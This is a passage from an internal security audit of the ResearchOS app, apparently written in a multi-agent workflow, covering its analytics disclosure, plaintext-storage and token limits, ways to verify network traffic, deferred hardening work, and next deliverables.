**We collect anonymous page-view pings via Vercel Web Analytics** (added at `62a34df0`, post-audit). When you navigate between pages, your browser sends an anonymous beacon to Vercel telling them "someone visited the GANTT page" or "someone visited Settings." That's it — no IDs, no folder contents, no typed text, no markdown bodies, no project names. Vercel sees your IP address (which they hash before storage per their privacy policy) and the route you visited. We use this to know which pages get used and which sit idle.

**You can turn it off.** Settings → Offline mode. With offline mode on, the analytics script is never injected and no beacons fire — the toggle is read at component-mount time and respected durably across reloads.

**We do not collect anything else.** No Sentry, no Google Analytics, no Mixpanel, no PostHog, no Hotjar, no Datadog, no Amplitude. No background "phone home." No crash reporter. No content telemetry. Your `npm ls` will confirm only `@vercel/analytics` is present, and the network tab will confirm no other endpoints are contacted.

**The Report-an-issue button does not auto-submit anything.** When you click it, your browser opens a pre-filled GitHub issue URL in a new tab. You see the body, you can edit it, and you click "Submit." Nothing happens until you do.

### Honest limits worth knowing about

- **Folder sharing means folder trust.** If you share your data folder with a lab-mate over OneDrive / Dropbox / iCloud, every byte is theirs to read. The per-user password gate stops accidental account-switching, not malicious access.
- **Passwords aren't encryption.** We hash passwords with PBKDF2-SHA-256 (600k iterations) so a snooping co-located user can't trivially read them, but the data itself sits in plaintext on disk. Anyone with disk access has it. Use OS-level full-disk encryption (FileVault, BitLocker) if your laptop walks around.
- **Bot tokens are real credentials.** If someone reads your `users/<u>/_telegram.json`, they can post and read messages on the bot's chats. We auto-gitignore the file so it doesn't slip into a git push, but the file itself is plaintext.
- **Public hosting is opt-in.** If you self-host ResearchOS on a public Vercel deploy with no auth gate, anyone on the internet can hit your two proxy routes (subject to rate limiting). It's not a data-exfiltration risk (the proxies have no access to your data folder), but it does mean someone could burn your Vercel function budget. Set `UPSTASH_REDIS_REST_URL` for shared-state rate limiting on public deploys (the wiring is already there).

### How to verify it yourself

The user-facing chips proposed in the audit (and queued for chip review) will surface:
1. **Data inventory diagnostic** in Settings — live list of every file path written and every IndexedDB key in use.
2. **Offline mode toggle** — disables the two proxy routes for users who want zero outbound network from the app surface.
3. **"Where is this stored?" tooltips** on each integration field so you always know which file holds the credential you just entered.

You can also open DevTools → Network and watch every request the app makes. The expected destinations are: `api.telegram.org` (direct, with your bot token, when Telegram is paired), the two `/api/...` proxies above, and (unless offline mode is on) Vercel Analytics at `va.vercel-scripts.com` for the script load and `vitals.vercel-insights.com` for page-view beacons. Nothing else.

---

## 5. Out of scope / future work

- **Folder-level encryption.** A passphrase-derived symmetric key (Argon2 or scrypt + AES-GCM) over every file write would harden the misshared-folder threat. Significant UX cost (decrypt on every read, key rotation story); deferred until labs ask for it.
- **Per-tab fileService isolation.** Today the service is a module global; an XSS that lands inside the React tree has direct access. Hardening would mean wrapping fileService behind a postMessage RPC to a Worker. Worth considering once finding 3.1 lands.
- **Audit log of writes.** A `users/<u>/_audit.json` capturing who-wrote-what-when would help post-incident forensics in a multi-user folder. Currently no such log exists.
- **External security review.** This audit is internal. A genuinely independent review by an outside auditor would strengthen the trust claim when pitching to labs.
- **Bundled dependency CVE sweep.** `npm audit` is noisy but worth running on every release cut. Not done in this pass.

---

## 6. Audit completion

This document is the first deliverable for the security manager role. Next deliverables per the role brief:

1. **Fix chip for finding 3.1 + 3.2** (rehype-sanitize + CSP headers). Fires after Grant approves this audit; bug-fix manager and master both notified once the chip is queued so other in-flight chips don't collide on the four markdown render sites.
2. **Wiki page seed handoff** (§4 above) routed to wiki manager via Grant relay.
3. **In-app affordance chips** (data inventory, offline-mode toggle, storage tooltips) queued as separate chips per the role brief.

— security manager
